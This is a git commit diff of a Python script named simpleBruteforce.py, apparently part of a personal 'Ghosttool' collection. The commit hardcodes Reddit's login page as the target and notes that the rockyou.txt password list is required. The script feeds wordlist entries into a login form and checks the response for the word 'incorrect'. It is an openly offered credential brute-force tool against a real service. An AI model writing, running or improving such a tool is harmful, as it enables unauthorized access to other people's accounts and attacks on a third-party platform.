7d04730f6cb8029bcc3b0f5aa5f81139da6e9dab
Ghost56 <94029083+ArchGhost56@users.noreply.github.com>
2021-11-10 21:32:08 +0800

    Update simpleBruteforce.py

--- simpleBruteforce.py
+++ simpleBruteforce.py
@@ -1,11 +1,16 @@
 import requests
 import sys
 import os
+import time
 
 os.system("figlet BRUTEFORCE")
 print ("----------Ghosttool----------")
+time.sleep(2)
+print ("starting..")
+time.sleep(2)
 
-url = input  ("URL   : ")
+
+url =  'https://www.reddit.com/login/' #change url here
 expression = "incorrect"
 def brute(username,password):
 	data = {'username':username,'password':password}
@@ -19,7 +24,7 @@ def brute(username,password):
 
 
 
-def main():
+def main():                              #note that you need rockyou.txt
 	words = [w.strip() for w in open("rockyou.txt", "rb").readlines()] #parse wordlist
 	for payload in words:
 		brute(payload,"a")
